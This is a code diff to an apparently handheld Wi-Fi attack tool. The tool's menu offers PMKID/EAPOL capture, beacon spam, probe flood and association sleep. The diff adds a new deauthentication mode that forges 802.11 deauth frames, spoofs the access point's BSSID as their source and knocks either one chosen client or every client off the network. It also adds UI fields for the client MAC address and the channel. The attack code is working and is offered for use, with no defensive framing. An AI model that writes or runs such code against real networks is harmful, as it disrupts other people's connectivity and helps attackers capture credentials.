@@ -59,7 +59,7 @@ extern const ::AppManifest manifest;
 namespace {
 
 enum class Screen { Main, Capture, Inject, Network };
-enum class InjectMode { Beacon, Probe, Sleep };
+enum class InjectMode { Beacon, Probe, Deauth, Sleep };
 enum class NetMode { Host, Ssh, Telnet, Port };
 
 constexpr uint32_t POLL_INTERVAL_MS = 200;
@@ -148,6 +148,9 @@ struct Context {
     char targetBssidText[18] = {0};
     uint8_t targetBssid[6] = {0};
     bool targetBssidKnown = false;
+    char deauthClientText[18] = {0};
+    uint8_t deauthClient[6] = {0};
+    bool deauthClientKnown = false;
     uint8_t localMac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
 
     // Network scan state (worker thread + shared results).
@@ -453,6 +456,9 @@ static size_t buildProbeRequest(uint8_t* out, const char* ssid, size_t ssidLen, 
 }
 
 static size_t buildDeauth(uint8_t* out, const uint8_t dest[6], const uint8_t bssid[6], bool bcast) {
+    static uint16_t s_deauthSeq = 0;
+    s_deauthSeq = (s_deauthSeq + 1) & 0x0FFF;
+    uint16_t seq = s_deauthSeq << 4; // fragment(4) | sequence(12)
     size_t i = 0;
     out[i++] = 0xC0; out[i++] = 0x00;
     out[i++] = 0x00; out[i++] = 0x00;
@@ -463,7 +469,8 @@ static size_t buildDeauth(uint8_t* out, const uint8_t dest[6], const uint8_t bss
     }
     std::memcpy(out + i, bssid, 6); i += 6;
     std::memcpy(out + i, bssid, 6); i += 6;
-    out[i++] = 0x00; out[i++] = 0x00;
+    out[i++] = static_cast<uint8_t>(seq & 0xff);
+    out[i++] = static_cast<uint8_t>((seq >> 8) & 0xff);
     out[i++] = 0x07; out[i++] = 0x00;
     return i;
 }
@@ -500,6 +507,11 @@ static void onInjectTick(Context* ctx) {
             }
             case InjectMode::Sleep:
                 len = buildDeauth(frame, ctx->targetMac, usedBssid ? bssid : ctx->localMac, !usedBssid);
+                break;
+            case InjectMode::Deauth:
+                // Targeted when a client MAC is set, otherwise broadcast. Spoof the AP's BSSID
+                // as the source (Addr2/Addr3) so clients treat it as the AP deauthenticating them.
+                len = buildDeauth(frame, ctx->deauthClient, usedBssid ? bssid : ctx->localMac, !ctx->deauthClientKnown);
                 break;
         }
         if (len > 0) {
@@ -725,14 +737,23 @@ static void addMenuButton(Context* ctx, const char* text, void (*cb)(lv_event_t*
 }
 
 static void onGoCapture(lv_event_t* e) { ShowScreen(static_cast<Context*>(lv_event_get_user_data(e)), Screen::Capture); }
-static void onGoInject(lv_event_t* e) { ShowScreen(static_cast<Context*>(lv_event_get_user_data(e)), Screen::Inject); }
 static void onGoNetwork(lv_event_t* e) { ShowScreen(static_cast<Context*>(lv_event_get_user_data(e)), Screen::Network); }
+
+static void setInjectModeAndGo(Context* ctx, InjectMode mode) {
+    ctx->injectMode = mode;
+    ShowScreen(ctx, Screen::Inject);
+}
+static void onGoBeacon(lv_event_t* e) { setInjectModeAndGo(static_cast<Context*>(lv_event_get_user_data(e)), InjectMode::Beacon); }
+static void onGoProbe(lv_event_t* e) { setInjectModeAndGo(static_cast<Context*>(lv_event_get_user_data(e)), InjectMode::Probe); }
+static void onGoDeauth(lv_event_t* e) { setInjectModeAndGo(static_cast<Context*>(lv_event_get_user_data(e)), InjectMode::Deauth); }
+static void onGoSleep(lv_event_t* e) { setInjectModeAndGo(static_cast<Context*>(lv_event_get_user_data(e)), InjectMode::Sleep); }
 
 static void showMainScreen(Context* ctx) {
     addMenuButton(ctx, "PMKID / EAPOL Capture", onGoCapture);
-    addMenuButton(ctx, "Beacon Spam", onGoInject);
-    addMenuButton(ctx, "Probe Flood", onGoInject);
-    addMenuButton(ctx, "Association Sleep", onGoInject);
+    addMenuButton(ctx, "Beacon Spam", onGoBeacon);
+    addMenuButton(ctx, "Probe Flood", onGoProbe);
+    addMenuButton(ctx, "Deauth (targeted + broadcast)", onGoDeauth);
+    addMenuButton(ctx, "Association Sleep", onGoSleep);
     addMenuButton(ctx, "WiFi + Net Utilities", onGoNetwork);
 }
 
@@ -844,25 +865,67 @@ static void onInjectBssidChanged(lv_event_t* event) {
     ctx->targetBssidKnown = parseMac(ctx->targetBssidText, ctx->targetBssid);
 }
 
+static void onInjectChannelChanged(lv_event_t* event) {
+    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
+    auto* dropdown = static_cast<lv_obj_t*>(lv_event_get_target(event));
+    uint32_t index = lv_dropdown_get_selected(dropdown);
+    ctx->lockChannel = (index == 0) ? 0 : kChannels[index - 1];
+    if (ctx->wifi != nullptr && ctx->lockChannel != 0) {
+        wifi_set_channel(ctx->wifi, ctx->lockChannel);
+    }
+}
+
+static void onInjectClientMacChanged(lv_event_t* event) {
+    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
+    auto* ta = static_cast<lv_obj_t*>(lv_event_get_target(event));
+    std::strncpy(ctx->deauthClientText, lv_textarea_get_text(ta), sizeof(ctx->deauthClientText) - 1);
+    ctx->deauthClientText[sizeof(ctx->deauthClientText) - 1] = '\0';
+    ctx->deauthClientKnown = parseMac(ctx->deauthClientText, ctx->deauthClient);
+}
+
 static void showInjectScreen(Context* ctx) {
+    bool isDeauth = (ctx->injectMode == InjectMode::Deauth);
     const char* modeText = ctx->injectMode == InjectMode::Beacon ? "Beacon Spam"
-        : (ctx->injectMode == InjectMode::Probe ? "Probe Flood" : "Association Sleep");
+        : (ctx->injectMode == InjectMode::Probe ? "Probe Flood"
+        : (ctx->injectMode == InjectMode::Deauth ? "Deauth" : "Association Sleep"));
     auto* label = lv_label_create(ctx->body);
     lv_label_set_text(label, modeText);
 
-    auto* ssidTextarea = lv_textarea_create(ctx->body);
-    lv_textarea_set_placeholder_text(ssidTextarea, "SSID (blank = Funny list for beacon)");
-    lv_textarea_set_one_line(ssidTextarea, true);
-    lv_textarea_set_accepted_chars(ssidTextarea, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 _-.,:()[]!?*");
-    lv_obj_set_width(ssidTextarea, LV_PCT(100));
-    lv_obj_add_event_cb(ssidTextarea, onInjectSsidChanged, LV_EVENT_VALUE_CHANGED, ctx);
+    // SSID input for beacon/probe only; deauth/sleep don't use it.
+    if (ctx->injectMode != InjectMode::Deauth && ctx->injectMode != InjectMode::Sleep) {
+        auto* ssidTextarea = lv_textarea_create(ctx->body);
+        lv_textarea_set_placeholder_text(ssidTextarea, "SSID (blank = Funny list for beacon)");
+        lv_textarea_set_one_line(ssidTextarea, true);
+        lv_textarea_set_accepted_chars(ssidTextarea, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 _-.,:()[]!?*");
+        lv_obj_set_width(ssidTextarea, LV_PCT(100));
+        lv_obj_add_event_cb(ssidTextarea, onInjectSsidChanged, LV_EVENT_VALUE_CHANGED, ctx);
+    }
 
+    // AP BSSID spoofed as the frame source for deauth/sleep.
     auto* bssidTextarea = lv_textarea_create(ctx->body);
-    lv_textarea_set_placeholder_text(bssidTextarea, "Target BSSID (aa:bb:cc:dd:ee:ff), blank = broadcast");
+    lv_textarea_set_placeholder_text(bssidTextarea, "AP BSSID to spoof (aa:bb:cc:dd:ee:ff)");
     lv_textarea_set_one_line(bssidTextarea, true);
     lv_textarea_set_accepted_chars(bssidTextarea, "0123456789abcdefABCDEF:");
     lv_obj_set_width(bssidTextarea, LV_PCT(100));
     lv_obj_add_event_cb(bssidTextarea, onInjectBssidChanged, LV_EVENT_VALUE_CHANGED, ctx);
+
+    if (isDeauth) {
+        auto* clientTextarea = lv_textarea_create(ctx->body);
+        lv_textarea_set_placeholder_text(clientTextarea, "Client MAC to deauth (blank = broadcast all)");
+        lv_textarea_set_one_line(clientTextarea, true);
+        lv_textarea_set_accepted_chars(clientTextarea, "0123456789abcdefABCDEF:");
+        lv_obj_set_width(clientTextarea, LV_PCT(100));
+        lv_obj_add_event_cb(clientTextarea, onInjectClientMacChanged, LV_EVENT_VALUE_CHANGED, ctx);
+    }
+
+    // Channel selector.
+    auto* channelDropdown = lv_dropdown_create(ctx->body);
+    std::string channelOptions = "Auto";
+    for (uint8_t ch : kChannels) channelOptions += "\n" + std::to_string(ch);
+    lv_dropdown_set_options(channelDropdown, channelOptions.c_str());
+    lv_dropdown_set_selected(channelDropdown, 0);
+    lv_obj_set_width(channelDropdown, LV_PCT(100));
+    lv_obj_add_event_cb(channelDropdown, onInjectChannelChanged, LV_EVENT_VALUE_CHANGED, ctx);
 
     auto* button = lv_button_create(ctx->body);
     lv_obj_set_width(button, LV_PCT(100));
